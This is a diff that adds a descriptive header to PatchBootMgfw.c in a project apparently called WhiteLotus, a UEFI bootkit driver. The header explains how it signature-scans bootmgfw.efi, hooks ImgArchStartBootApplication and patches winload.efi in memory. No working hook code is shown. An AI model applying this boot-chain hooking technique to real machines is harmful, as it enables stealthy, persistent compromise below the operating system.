@@ -1,3 +1,30 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : PatchBootMgfw.c
+ * ============================================================
+ *
+ *  Description:
+ *    Locates ImgArchStartBootApplication (or its earlier alias
+ *    ImgArchEfiStartBootApplication) inside bootmgfw.efi via
+ *    byte-pattern signature search, then installs a trampoline
+ *    hook. The hook intercepts the call to winload.efi,
+ *    patches it in-memory, and restores the original function
+ *    bytes before passing control back to the boot manager.
+ *
+ *  Purpose:
+ *    - Intercept the bootmgfw -> winload handoff to inject
+ *      the winload patch chain.
+ *    - Support both Windows Vista/8 and Windows 10 RS+
+ *      function naming and signature variants.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "PatchBootMgfw.h"
 
 // Hook handler for ImgArchStartBootApplication
